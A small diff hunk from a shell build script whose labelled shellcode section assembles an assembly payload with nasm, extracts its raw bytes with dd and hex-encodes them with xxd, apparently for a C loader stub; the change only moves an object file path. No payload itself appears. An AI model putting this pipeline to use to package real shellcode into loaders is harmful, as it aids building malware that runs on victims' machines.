@@ -8,8 +8,8 @@ stub_file="temp/loader.c"
 
 #-----------SHELLCODE---------------
 
-nasm -f elf64 asm/$payload_file -o build/shell.o
-ld build/shell.o -o temp/shell 2>/dev/null
+nasm -f elf64 asm/$payload_file -o temp/shell.o
+ld temp/shell.o -o temp/shell 2>/dev/null
 dd if=temp/shell of=temp/instructions_trash bs=1 skip=$((0x1000)) count=$((0x500)) 2>/dev/null
 
 hexa_content=$(xxd -p temp/instructions_trash)
